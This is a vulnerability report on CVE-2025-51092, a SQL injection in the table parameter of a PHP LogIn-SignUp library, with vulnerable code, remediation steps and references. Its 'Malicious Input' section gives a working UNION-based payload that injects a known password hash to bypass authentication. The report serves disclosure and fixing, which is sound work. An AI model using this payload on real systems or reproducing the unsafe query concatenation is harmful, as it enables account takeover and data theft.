# CVE-2025-51092 Vulnerability Report

## Overview

- **CVE ID**: CVE-2025-51092
- **CWE ID**: CWE-89 (SQL Injection)
- **CVSS Score**: 9.8 (Critical)
- **Affected Software**: LogIn-SignUp by VishnuSivadasVS
- **Repository**: https://github.com/VishnuSivadasVS/LogIn-SignUp

## Vulnerability Description

The `logIn()` and `signUp()` functions in `DataBase.php` construct SQL queries by directly concatenating the `$table` parameter and other user inputs without using prepared statements. While a `prepareData()` function exists for username/password/email fields, the `$table` parameter is not validated at all.

## Vulnerable Code

```php
function logIn($table, $username, $password)
{
    $username = $this->prepareData($username);
    $password = $this->prepareData($password);
    $this->sql = "select * from " . $table . " where username = '" . $username . "'";
    // ...
}
```

The `$table` parameter is directly concatenated into the SQL query without any sanitization.

## Exploitation

When a developer uses this library and passes user-controlled input to the `$table` parameter (as shown in the library's README documentation), an attacker can inject SQL:

### Malicious Input
```
table: users WHERE 1=2 UNION SELECT 1,'Admin','injected','$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi','email' -- 
username: injected
password: password
```

### Resulting SQL Query
```sql
SELECT * FROM users WHERE 1=2 UNION SELECT 1,'Admin','injected','<bcrypt_hash>','email' --  WHERE username = 'injected'
```

This returns a crafted row with a known password hash, bypassing authentication.

## Impact

1. **Authentication Bypass**: Attacker can login without valid credentials
2. **Data Extraction**: UNION-based injection allows extracting data from any table
3. **Database Compromise**: Depending on database permissions, further exploitation possible

## Proof of Concept Results

```
[*] Running SQL injection test in container...
[+] VULNERABILITY CONFIRMED!
[+] SQL injection via table parameter bypasses authentication
```

## References

- CVE: https://nvd.nist.gov/vuln/detail/CVE-2025-51092
- Advisory: https://abimelsbk.hashnode.dev/sql-injection-vulnerability-at-login-signup-php-project
- GitHub Issue: https://github.com/VishnuSivadasVS/LogIn-SignUp/issues/6
- Fix PR: https://github.com/VishnuSivadasVS/LogIn-SignUp/pull/7

## Remediation

1. Use prepared statements with `mysqli_prepare()` and `mysqli_stmt_bind_param()`
2. Whitelist allowed table names
3. Never concatenate user input directly into SQL queries
